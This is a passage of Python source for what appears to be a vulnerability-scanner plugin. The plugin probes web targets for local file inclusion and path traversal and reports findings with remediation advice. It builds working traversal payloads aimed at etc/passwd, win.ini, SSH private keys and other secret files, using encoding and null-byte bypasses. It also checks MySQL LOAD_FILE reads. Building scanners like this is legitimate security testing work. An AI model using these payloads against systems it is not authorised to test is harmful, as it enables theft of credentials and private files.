                template_id="xasm-lfi-path-style-file-read",
                name="Path-Style Local File Inclusion",
                severity="high",
                matched_at=url,
                description="The target returned non-fallback content for an absolute filesystem path.",
                remediation="Reject absolute paths and traversal, and serve only mapped file identifiers.",
                matcher_name="absolute-path-read",
                extracted=extracted,
                request=request,
                response=response,
                curl_command=curl_command,
            )
        return None

    def _finding(
        self,
        *,
        template_id: str,
        name: str,
        severity: str,
        matched_at: str,
        description: str,
        remediation: str,
        matcher_name: str,
        extracted: List[str],
        request: Optional[str] = None,
        response: Optional[str] = None,
        curl_command: Optional[str] = None,
    ) -> Dict[str, Any]:
        finding = {
            "template-id": template_id,
            "templateID": template_id,
            "matched-at": matched_at,
            "matched": matched_at,
            "host": matched_at,
            "matcher-name": matcher_name,
            "extracted-results": [item for item in extracted if item and item != "None"],
            "info": {
                "name": name,
                "severity": severity,
                "description": description,
                "remediation": remediation,
            },
        }
        if request:
            finding["request"] = request
        if response:
            finding["response"] = response
        if curl_command:
            finding["curl-command"] = curl_command
        return finding

    def _dedupe_findings(self, findings: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        deduped: Dict[str, Dict[str, Any]] = {}
        for finding in findings:
            raw_key = f"{finding.get('template-id')}|{finding.get('matched-at')}"
            deduped.setdefault(hashlib.sha256(raw_key.encode()).hexdigest(), finding)
        return list(deduped.values())

    def _finding_line(self, finding: Dict[str, Any]) -> str:
        info = finding.get("info") or {}
        return f"[{str(info.get('severity', 'info')).upper()}] {info.get('name')} - {finding.get('matched-at')}"

    def _build_lfi_url(self, target: str, path: str, mode: str = "double-slash") -> str:
        parsed = urlparse(target)
        origin = f"{parsed.scheme}://{parsed.netloc}"
        normalized_path = self._normalize_path(path)
        if mode == "single-slash":
            return f"{origin}{normalized_path}"
        if mode == "relative":
            base_path = parsed.path.rstrip("/") or ""
            return f"{origin}{base_path}{normalized_path}"
        return f"{origin}/{normalized_path}"

    def _build_probe_specs(
        self,
        target: str,
        probe_paths: List[str],
        parameters: Dict[str, Any],
        *,
        max_requests: int,
        join_mode: str,
    ) -> List[Dict[str, str]]:
        specs: List[Dict[str, str]] = []
        seen = set()

        def add(path: str, url: str, source: str) -> None:
            key = (path, url)
            if key in seen:
                return
            seen.add(key)
            specs.append({"path": path, "url": url, "source": source})

        # #1285: parameterized surfaces are the high-signal path-traversal sink.
        # Schedule them before the legacy direct-path pack so a bounded
        # maxRequests=50 run cannot spend its entire budget on //etc/* URLs.
        for url in self._surface_lfi_candidate_urls(target, probe_paths, parameters):
            parsed = urlparse(url)
            path_hint = self._path_hint_from_url(parsed)
            add(path_hint, url, "surface-derived")
            if len(specs) >= max_requests:
                break

        for path in probe_paths:
            if len(specs) >= max_requests:
                break
            add(path, self._build_lfi_url(target, path, join_mode), "direct-path")
        return specs[:max_requests]

    def _surface_lfi_candidate_urls(
        self,
        target: str,
        probe_paths: List[str],
        parameters: Dict[str, Any],
    ) -> List[str]:
        candidates: List[str] = []
        surface_urls = self._extract_surface_urls(target, parameters)
        lfi_paths = [p for p in probe_paths if p != self._normalize_path(str(parameters.get("negativeControlPath") or NEGATIVE_CONTROL_PATH))]
        # #318: app-secret pack reached by ``../`` traversal through a file/download param.
        sensitive_targets = self._sensitive_traversal_targets(parameters)
        depths = self._traversal_depths(parameters)
        for source_url in surface_urls:
            parsed = urlparse(source_url)
            # #318: a surfaced URL that ALREADY carries a MySQL LOAD_FILE() read
            # (e.g. handed off from a SQLi/sqlmap step) is probed AS-IS — this
            # GET-only tool does not craft SQLi, it confirms + classifies + tags
            # the DB-layer file read the upstream step found.
            if LOAD_FILE_RE.search(source_url):
                candidates.append(source_url)
            if parsed.query:
                # #1285: put a surface-specific negative control and one
                # representative from every authored path-traversal bypass
                # family first. The depth expansions follow inside the helper.
                negative_path = self._normalize_path(
                    str(parameters.get("negativeControlPath") or NEGATIVE_CONTROL_PATH)
                )
                if bool(parameters.get("includeNegativeControl", True)):
                    rendered = self._replace_lfi_query_params(source_url, negative_path)
                    if rendered:
                        candidates.append(rendered)
                candidates.extend(self._path_traversal_bypass_urls(source_url, depths))
                for path in lfi_paths:
                    rendered = self._replace_lfi_query_params(source_url, path)
                    if rendered:
                        candidates.append(rendered)
                candidates.extend(self._traversal_candidate_urls(source_url, sensitive_targets, depths))
            if self._looks_like_lfi_path_template(parsed.path):
                for path in lfi_paths:
                    rendered = self._render_path_template(target, parsed.path, path)
                    if rendered:
                        candidates.append(rendered)
        for endpoint in self._extract_api_endpoints(target, parameters):
            path_value = endpoint.get("path") or endpoint.get("url") or ""
            parsed = urlparse(str(path_value))
            endpoint_url = endpoint.get("url") or ""
            if endpoint_url and urlparse(str(endpoint_url)).query:
                candidates.extend(self._traversal_candidate_urls(str(endpoint_url), sensitive_targets, depths))
            endpoint_path = parsed.path if parsed.scheme else str(path_value)
            if not self._looks_like_lfi_path_template(endpoint_path):
                continue
            for path in lfi_paths:
                rendered = self._render_path_template(target, endpoint_path, path)
                if rendered:
                    candidates.append(rendered)
        return dedupe_keep_order([url for url in candidates if same_origin(target, url)], 240)

    def _path_traversal_bypass_urls(self, url: str, depths: List[int]) -> List[str]:
        """Build a compact, ordered V1-V6 bypass ladder for path-like params.

        The first candidates cover every authored family at a representative
        depth. Remaining depths are expanded only afterwards, keeping all six
        classes reachable within a small request budget.
        """
        parsed = urlparse(url)
        query = parse_qsl(parsed.query, keep_blank_values=True)
        path_values = [value for name, value in query if name.lower() in TRAVERSAL_PARAM_NAMES]
        if not path_values:
            return []

        ordered_depths = dedupe_keep_order(
            [3, *[depth for depth in depths if isinstance(depth, int) and 0 < depth <= 12]],
            12,
        )
        primary_depth = ordered_depths[0]
        original_value = path_values[0]
        original_dir = original_value.rsplit("/", 1)[0] if original_value.startswith("/") and "/" in original_value else ""
        original_ext = Path(original_value).suffix if original_value else ""
        extensions = dedupe_keep_order([original_ext, ".png", ".jpg"], 3)

        def plain(depth: int) -> str:
            return ("../" * depth) + "etc/passwd"

        def nested(depth: int) -> str:
            return ("....//" * depth) + "etc/passwd"

        def double_encoded(depth: int) -> str:
            # urlencode() below escapes '%' once more, producing the desired
            # on-wire %252e%252e%252f sequence for a two-stage decoder.
            return ("%2e%2e%2f" * depth) + "etc%2fpasswd"

        payloads: List[str] = [
            plain(primary_depth),
            "/etc/passwd",
            nested(primary_depth),
            double_encoded(primary_depth),
        ]
        if original_dir:
            payloads.append(f"{original_dir}/{plain(primary_depth)}")
        for extension in extensions:
            if extension:
                payloads.append(f"{plain(primary_depth)}\x00{extension}")
        payloads.append(("..\\" * primary_depth) + "windows\\win.ini")

        remaining_depths = [depth for depth in ordered_depths if depth != primary_depth]
        for depth in remaining_depths:
            payloads.extend([plain(depth), nested(depth), double_encoded(depth)])
            if original_dir:
                payloads.append(f"{original_dir}/{plain(depth)}")
            if extensions:
                payloads.append(f"{plain(depth)}\x00{extensions[0]}")

        candidates = [self._replace_traversal_param(url, payload) for payload in payloads]
        return dedupe_keep_order([candidate for candidate in candidates if candidate], 80)

    def _sensitive_traversal_targets(self, parameters: Dict[str, Any]) -> List[str]:
        """Relative-form secret targets (no leading slash) for ``../`` prefixing."""
        if not bool(parameters.get("sensitiveFilePack", True)):
            return []
        targets = list(SENSITIVE_REL_FILES)
        targets += [f"home/{user}/.ssh/id_rsa" for user in SENSITIVE_SSH_USERS]
        targets += [abs_path.lstrip("/") for abs_path in SENSITIVE_ABS_FILES]
        extra = parameters.get("sensitiveFiles")
        if isinstance(extra, list):
            targets += [str(item).lstrip("/") for item in extra if str(item or "").strip()]
        return dedupe_keep_order(targets, 60)

    def _traversal_depths(self, parameters: Dict[str, Any]) -> List[int]:
        raw = parameters.get("traversalDepth")
        if isinstance(raw, bool):
            raw = None
        if isinstance(raw, int) and raw > 0:
            return list(range(1, min(raw, 12) + 1))
        if isinstance(raw, list):
            depths = [d for d in raw if isinstance(d, int) and 0 < d <= 12][:12]
            return depths or list(DEFAULT_TRAVERSAL_DEPTHS)
        return list(DEFAULT_TRAVERSAL_DEPTHS)

    def _traversal_candidate_urls(self, url: str, sensitive_targets: List[str], depths: List[int]) -> List[str]:
        parsed = urlparse(url)
        query = parse_qsl(parsed.query, keep_blank_values=True)
        if not any(name.lower() in TRAVERSAL_PARAM_NAMES for name, _ in query):
            return []
        out: List[str] = []
        for target_file in sensitive_targets:
            for payload in [target_file, *[("../" * depth) + target_file for depth in depths]]:
                rendered = self._replace_traversal_param(url, payload)
                if rendered:
                    out.append(rendered)
        return out

    def _replace_traversal_param(self, url: str, payload: str) -> Optional[str]:
        """Swap a traversal-family param with ``payload`` VERBATIM (keeps ``../``)."""
        parsed = urlparse(url)
        query = parse_qsl(parsed.query, keep_blank_values=True)
        if not query:
            return None
        replaced = False
        next_query: List[Tuple[str, str]] = []
        for name, value in query:
            if name.lower() in TRAVERSAL_PARAM_NAMES:
                next_query.append((name, payload))
                replaced = True
            else:
                next_query.append((name, value))
        if not replaced:
            return None
        return urlunparse(parsed._replace(query=urlencode(next_query, doseq=True)))

    def _detect_load_file(self, *sources: Any) -> Optional[Dict[str, str]]:
        """Recognize a MySQL ``LOAD_FILE('/path')`` DB-layer read in any source string."""
        for source in sources:
            match = LOAD_FILE_RE.search(str(source or ""))
            if match:
                return {"primitive": "mysql_load_file", "path": match.group("path").strip()}
        return None

    def _redact_dotenv_pairs(self, body: str, limit: int = 25) -> List[str]:
        """Mask dotenv values — key names kept, values replaced with sha256 digest."""
        out: List[str] = []
        for match in DOTENV_KV_RE.finditer(body or ""):
            name = match.group(1).strip()
            value = match.group(2).strip().strip('"').strip("'")
            digest = hashlib.sha256(value.encode("utf-8", "replace")).hexdigest()[:12] if value else "empty"
            out.append(f"{name}=<redacted:sha256:{digest}>")
            if len(out) >= limit:
                break
        return out

    def _extract_surface_urls(self, target: str, parameters: Dict[str, Any]) -> List[str]:
        values: List[Any] = []
        for key in ("urls", "discoveredUrls", "links", "targets", "parameterizedUrls", "siteMapUrls"):
            raw = parameters.get(key)
            if isinstance(raw, list):
                values.extend(raw)
        graph = parameters.get("surfaceGraph")
        if isinstance(graph, dict):
            for key in ("urls", "parameterizedUrls", "links", "siteMapUrls"):
                raw = graph.get(key)
                if isinstance(raw, list):
                    values.extend(raw)
        urls: List[str] = []
        for value in values:
            url = self._coerce_url(target, value)
            if url:
                urls.append(url)
        return dedupe_keep_order(urls, 240)

    def _extract_api_endpoints(self, target: str, parameters: Dict[str, Any]) -> List[Dict[str, str]]:
        values: List[Any] = []
        raw = parameters.get("apiEndpoints")
        if isinstance(raw, list):
            values.extend(raw)
        graph = parameters.get("surfaceGraph")
        if isinstance(graph, dict) and isinstance(graph.get("apiEndpoints"), list):
            values.extend(graph.get("apiEndpoints"))
        out: List[Dict[str, str]] = []
        for item in values:
            if isinstance(item, str):
                url = self._coerce_url(target, item)
                out.append({"url": url or item, "path": urlparse(url).path if url else item})
            elif isinstance(item, dict):
                url = self._coerce_url(target, item.get("url") or item.get("href") or item.get("path"))
                path = str(item.get("path") or item.get("originalPath") or item.get("route") or "")
                out.append({"url": url or "", "path": path or (urlparse(url).path if url else "")})
        return out

    def _coerce_url(self, target: str, value: Any) -> Optional[str]:
        raw = value
        if isinstance(value, dict):
            raw = value.get("url") or value.get("href") or value.get("path")
        text = str(raw or "").strip()
        if not text:
            return None
        try:
            if text.startswith("/"):
                return urljoin(target, text)
            if text.startswith("http://") or text.startswith("https://"):
                return normalize_url(text)
        except Exception:
            return None
        return None

    def _replace_lfi_query_params(self, url: str, path: str) -> Optional[str]:
        parsed = urlparse(url)
        query = parse_qsl(parsed.query, keep_blank_values=True)
        if not query:
            return None
        replaced = False
        next_query = []
        for name, value in query:
            if name.lower() in LFI_PARAM_NAMES:
                next_query.append((name, path))
                replaced = True
            else:
                next_query.append((name, value))
        if not replaced:
            return None
        return urlunparse(parsed._replace(query=urlencode(next_query, doseq=True)))

    def _looks_like_lfi_path_template(self, path: str) -> bool:
        return bool(LFI_TEMPLATE_RE.search(str(path or "")))

    def _render_path_template(self, target: str, template_path: str, file_path: str) -> Optional[str]:
        if not template_path:
            return None
        replacement = self._normalize_path(file_path).lstrip("/")
        rendered = LFI_TEMPLATE_RE.sub(replacement, template_path)
        if not rendered.startswith("/"):
            rendered = f"/{rendered}"
        parsed = urlparse(target)
        origin = f"{parsed.scheme}://{parsed.netloc}"
        try:
            return normalize_url(f"{origin}{rendered}")
        except Exception:
            return None

    def _path_hint_from_url(self, parsed) -> str:
        query = parse_qsl(parsed.query, keep_blank_values=True)
        for name, value in query:
            if name.lower() in LFI_PARAM_NAMES and value:
                return self._normalize_path(value)
        return parsed.path or "/"

    def _normalize_path(self, path: str) -> str:
        path = str(path or "").strip()
        if not path.startswith("/"):
            path = f"/{path}"
        return path

    def _request_transcript(self, url: str, headers: Dict[str, str]) -> str:
        parsed = urlparse(url)
        request_target = parsed.path or "/"
        if parsed.query:
            request_target = f"{request_target}?{parsed.query}"
        lines = [f"GET {request_target} HTTP/1.1", f"Host: {parsed.netloc}"]
        for name, value in sorted(headers.items()):
            if name.lower() == "host":
                continue
            lines.append(f"{name}: {self._redact_header(name, str(value))}")
        return "\r\n".join(lines) + "\r\n\r\n"

    def _response_transcript(
        self,
        status: int,
        reason: Optional[str],
        headers: aiohttp.typedefs.LooseHeaders,
        body: bytes,
        truncated: bool,
        excerpt_bytes: int,
    ) -> str:
        lines = [f"HTTP/1.1 {status} {reason or ''}".rstrip()]
        for name, value in sorted(dict(headers).items()):
            lines.append(f"{name}: {self._redact_header(name, str(value))}")
        lines.append("")
        if excerpt_bytes > 0:
            excerpt = body[:excerpt_bytes].decode("utf-8", errors="replace")
            lines.append(excerpt)
            if truncated or len(body) > excerpt_bytes:
                lines.append(f"\n[truncated: showing first {excerpt_bytes} bytes]")
        return "\r\n".join(lines)

    def _curl_command(self, url: str, headers: Dict[str, str]) -> str:
        parts = ["curl", "--path-as-is", "-i", "-sS"]
        for name, value in sorted(headers.items()):
            rendered_value = self._redact_header(name, str(value))
            parts.extend(["-H", self._shell_quote(f"{name}: {rendered_value}")])
        parts.append(self._shell_quote(url))
        return " ".join(parts)

    def _redact_header(self, name: str, value: str) -> str:
        if name.lower() in {"authorization", "cookie", "x-api-key", "proxy-authorization"}:
            return "[REDACTED]"
        return value

    def _shell_quote(self, value: str) -> str:
        return "'" + value.replace("'", "'\"'\"'") + "'"

    def _prepare_evidence_dir(self, parameters: Dict[str, Any], target: str) -> Path:
        root = Path(str(parameters.get("artifactRoot") or "/tmp/xasm-lfi-evidence"))
        host = re.sub(r"[^A-Za-z0-9_.-]+", "_", urlparse(target).netloc or "target")
        execution_id = str(parameters.get("executionId") or int(time.time()))
        evidence_dir = root / f"{host}-{execution_id}"
        evidence_dir.mkdir(mode=0o700, parents=True, exist_ok=True)
        try:
            os.chmod(evidence_dir, 0o700)
        except OSError:
            pass
        return evidence_dir

    def _write_artifacts(
        self,
        evidence_dir: Optional[Path],
        path: str,
        headers: aiohttp.typedefs.LooseHeaders,
        body: bytes,
    ) -> Dict[str, str]:
        if not evidence_dir:
            return {}
        safe_name = re.sub(r"[^A-Za-z0-9_.-]+", "__", path.strip("/")) or "root"
        body_path = evidence_dir / f"{safe_name}.body"
        headers_path = evidence_dir / f"{safe_name}.headers.json"
        body_path.write_bytes(body)
        headers_path.write_text(json.dumps(dict(headers), indent=2, sort_keys=True))
        try:
            os.chmod(body_path, 0o600)
            os.chmod(headers_path, 0o600)
        except OSError:
            pass
        return {"rawEvidencePath": str(body_path), "headersPath": str(headers_path)}


def get_tool():
    return LfiFileExposureProbeTool()
